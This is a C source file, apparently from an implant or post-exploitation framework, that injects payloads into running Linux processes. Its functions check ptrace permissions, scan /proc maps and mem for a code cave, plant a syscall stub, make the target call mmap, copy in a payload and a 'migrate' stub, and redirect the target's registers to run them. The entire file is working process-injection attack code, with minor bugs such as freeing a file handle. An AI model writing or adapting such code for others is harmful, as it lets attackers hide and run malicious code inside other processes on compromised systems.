#include "base_inject.h"


int is_root()
{
	return getuid() == 0;
}

int get_yama_ptrace_scope()
{
	char * ptrace_scope_path = "/proc/sys/kernel/yama/ptrace_scope";
	char ptrace_scope_value = 0;
	FILE * ptrace_scope_handler = fopen(ptrace_scope_path, "r");

	if(ptrace_scope_handler == NULL)
	{
		return -1;
	}

	fscanf(ptrace_scope_handler, "%c", &ptrace_scope_value);
	fclose(ptrace_scope_handler);

	return ptrace_scope_value - '0';
}

int migrate_support()
{
	char yama_scope = get_yama_ptrace_scope();
	
	if(yama_scope == 0)
	{
		return 1;
	}

	if(yama_scope == 1 || yama_scope == 2)
	{
		if(is_root())
			return 1;
		else
			return 0;
	}
	
	return 0;
}

char *get_permissions_from_line(char *line) {
      
   int first_space = -1;
      int second_space = -1;
      for (size_t i = 0; i < strlen(line); i++) {
          if (line[i] == ' ' && first_space == -1) {
              first_space = i + 1;
          }
          else if (line[i] == ' ' && first_space != -1) {
              second_space = i;
              break;
          }
      }

      if (first_space != -1 && second_space != -1 && second_space > first_space) {
          char *permissions = malloc(second_space - first_space + 1);
          if (permissions == NULL) {
              return NULL;
          }
          for (size_t i = first_space, j = 0; i < (size_t)second_space; i++, j++) {
              permissions[j] = line[i];
          }
          permissions[second_space - first_space] = '\0';
          return permissions;
      }
      return NULL;

  }


long get_end_address_from_maps_line(char *line) {

      char *start_address = strchr(line, '-') + 1;
      char *address_line = malloc(SIZE_OF_ADDRESS + 1);
      memset(address_line, 0, SIZE_OF_ADDRESS + 1);
      memcpy(address_line, start_address, SIZE_OF_ADDRESS);
      long address = strtol(address_line, (char **) NULL, 16);
      free(address_line);
      return address;
}


long get_start_address_from_maps_line(char *line) {

      char *address_line = malloc(SIZE_OF_ADDRESS + 1);
      memset(address_line, 0, SIZE_OF_ADDRESS + 1);
      memcpy(address_line, line, SIZE_OF_ADDRESS);
      long address = strtol(address_line, (char **) NULL, 16);
      free(address_line);
      return address;
}


char* itoa(int val, int base){
	
	static char buf[32] = {0};
	
	int i = 30;
	
	for(; val && i ; --i, val /= base)
	
		buf[i] = "0123456789abcdef"[val % base];
	
	return &buf[i+1];
	
}


void get_process_writable_sections(int pid, writable_section_ptr process_sections)
{

  FILE * maps_handler;
  char maps_file_path[80];
  char * line = NULL;
  size_t len = 0;
  int section_count = 0;
	
  strcpy(maps_file_path, "/proc/");

  strcat(maps_file_path, itoa(pid, 10));
  strcat(maps_file_path, "/maps");
  
  maps_handler = fopen(maps_file_path, "r");
  
  char * permissions;
  long start_address;
  long end_address;

  process_sections->pid = pid;

  while(getline(&line,&len, maps_handler) != -1)
  {
    permissions = get_permissions_from_line(line);

    char * permission = permissions;
    while(*permission != 0)
    {
      char permission_char = *permission;
      if(permission_char == 0x78)
        break;
      permission++;
    }
    
    if(*permission == 0)
      continue;

    free(permissions);

    start_address = get_start_address_from_maps_line(line);
    end_address = get_end_address_from_maps_line(line);

    process_sections->sections[section_count].start_address = start_address;
    process_sections->sections[section_count++].end_address = end_address;

    if(section_count >= 255)
      break;
    
    printf("Writable section found at: %lx - %lx\n", start_address, end_address);
  }
  
  free(maps_handler);

}


unsigned long find_codecave(int pid, int cave_size, writable_section_ptr process_sections)
{
	char mem_file_path[80];
	char * mem_data = NULL;
	FILE * mem_handler = NULL;
	int current_cave_size = 0;

	if(process_sections->pid == 0)
	{
		get_process_writable_sections(pid, process_sections);
	}
	
	strcpy(mem_file_path, "/proc/");

	strcat(mem_file_path, itoa(pid, 10));
	strcat(mem_file_path, "/mem");
	
	mem_handler = fopen(mem_file_path, "r");
	
	for(int i = 0; i < 255; i++)
	{
		long section_start = process_sections->sections[i].start_address;
		long section_end = process_sections->sections[i].end_address;
		
		fseek(mem_handler, section_start, SEEK_SET);

		long section_size = section_end - section_start;

		mem_data = malloc(sizeof(char)*(int)(section_end-section_start));
  
		fread(mem_data,sizeof(char), (int)(section_end-section_start), mem_handler);
		
		current_cave_size = 0;
		
		for(char * mem_byte = mem_data; mem_byte < mem_data + (section_end-section_start); mem_byte++)
		{

			if(*mem_byte != 0x00)
			 {
			   current_cave_size = 0;
			   continue;
			 }
			 if(current_cave_size == cave_size)
			 {

			   free(mem_data);
			   fclose(mem_handler);
			   return section_start + ((unsigned long)mem_byte - (unsigned long)mem_data) - cave_size;
			 }

			 current_cave_size++;
		}

		free(mem_data);
	}

	fclose(mem_handler);
	return 0;
}

int remote_write(int pid, long address, char * data, size_t data_length)
{
	int status 	= 0;

	kill(pid, SIGSTOP);

	waitpid(pid, NULL, 0);

	for(size_t i = 0; i < data_length; i+=sizeof(long))
	{
		long data_chunk = 0;
		memcpy(&data_chunk, data + i, sizeof(long));
		if( ptrace(PTRACE_POKETEXT, pid, address + i, data_chunk) != 0)
		{
			kill(pid, SIGCONT);
			waitpid(pid, NULL, 0);
			return 0;
		}
	}

	ptrace(PTRACE_CONT, pid, NULL, NULL);
	
	return 1;
}



int remote_mmap(int pid, long mmap_stub, long length, long prot, long flags, long fd, long offset, long * mmaped_address)
{
	int status;
	struct user_regs_struct saved_regs = { 0 };
	struct user_regs_struct regs = { 0 };
	
	kill(pid, SIGSTOP);

	waitpid(pid, NULL, 0);

	ptrace(PTRACE_GETREGS, pid, NULL, &saved_regs);

	regs.rip 	= mmap_stub;
	regs.rax	= 9;
	regs.rdi 	= 0;
	regs.rsi 	= length;
	regs.rdx 	= prot;
	regs.r10 	= flags;
	regs.r8 	= fd;
	regs.rsp	= saved_regs.rsp+0x100;
	regs.rbp	= saved_regs.rbp;

	ptrace(PTRACE_SETREGS, pid, NULL, &regs);
	
	ptrace(PTRACE_CONT, pid, NULL, NULL);
	
	wait(&status);

	if(WIFSTOPPED(status) && WSTOPSIG(status) == 5)
	{
		ptrace(PTRACE_GETREGS, pid, NULL, &regs);
		*mmaped_address = regs.rax;

		ptrace(PTRACE_SETREGS, pid, NULL, &saved_regs);
		ptrace(PTRACE_CONT, pid, NULL, NULL);
		return 1;
	}

	return 0;
}

long remote_allocate(int pid, size_t size, writable_section_ptr process_sections) 
{
	long codecave_address 	= 0;
	long mmaped_address	= 0;
	
	codecave_address = find_codecave(pid, sizeof(DO_SYSCALL), process_sections);

	if(codecave_address == 0)
		return 0;

	if(remote_write(pid, codecave_address, DO_SYSCALL, sizeof(DO_SYSCALL)) == 0)
		return 0;

	if(remote_mmap(pid, codecave_address, size, 0x6, 0x22, -1, 0, &mmaped_address) == 0)
		return 0;

	return mmaped_address;

}

int remote_call_payload(int pid, long payload_address, long stub_address)
{
	int status = 0;			
	struct user_regs_struct saved_regs = { 0 };
	struct user_regs_struct regs = { 0 };
	
	kill(pid, SIGSTOP);
	waitpid(pid, NULL, 0);
	
	if(ptrace(PTRACE_GETREGS, pid, NULL, &saved_regs) != 0)
	{
		ptrace(PTRACE_CONT, pid, NULL, NULL);
		return 0;
	}

	regs.rip 	= stub_address;
	regs.rsp	= saved_regs.rsp+0x100;
	regs.rbp	= saved_regs.rbp;
	regs.r9		= payload_address;

	ptrace(PTRACE_SETREGS, pid, NULL, &regs);
	
	ptrace(PTRACE_CONT, pid, NULL, NULL);
	
	wait(&status);

	if(WIFSTOPPED(status) && WSTOPSIG(status) == 5)
	{
		ptrace(PTRACE_SETREGS, pid, NULL, &saved_regs);
		ptrace(PTRACE_CONT, pid, NULL, NULL);
		return 1;
	}

	return 0;
}

int migrate(int pid, char * migrate_stub, size_t migrate_stub_length, char * payload, size_t payload_length, const char * uuid)
{
	struct user_regs_struct regs;
	long payload_address = 0;
	long migrate_stub_address = 0;

	writable_section_t process_sections = { 0 };

	ptrace(PTRACE_ATTACH, pid, NULL, NULL);
	waitpid(pid, NULL, 0);
	
	ptrace(PTRACE_CONT, pid, NULL, NULL);

	payload_address 	= remote_allocate(pid, payload_length, &process_sections);
	migrate_stub_address 	= remote_allocate(pid, migrate_stub_length, &process_sections);

	if(payload_address == 0 || migrate_stub_address == 0)
	{
		ptrace(PTRACE_DETACH, pid, NULL, NULL);
		return 0;
	}

	if(remote_write(pid, payload_address, payload, payload_length) == 0 || remote_write(pid, migrate_stub_address, migrate_stub, migrate_stub_length) == 0)
	{
		ptrace(PTRACE_DETACH, pid, NULL, NULL);
		return 0;
	}

	
	if( remote_call_payload(pid, payload_address, migrate_stub_address) == 0)
	{
		ptrace(PTRACE_DETACH, pid, NULL, NULL);
		return 0;
	}
	
	kill(pid, SIGSTOP);
	waitpid(pid, NULL, 0);
    	if(ptrace(PTRACE_DETACH, pid, NULL, NULL) != 0)
	{
		printf("Failed to detach from process %d\n", pid);
		return 0;
	}

	return 1;
}
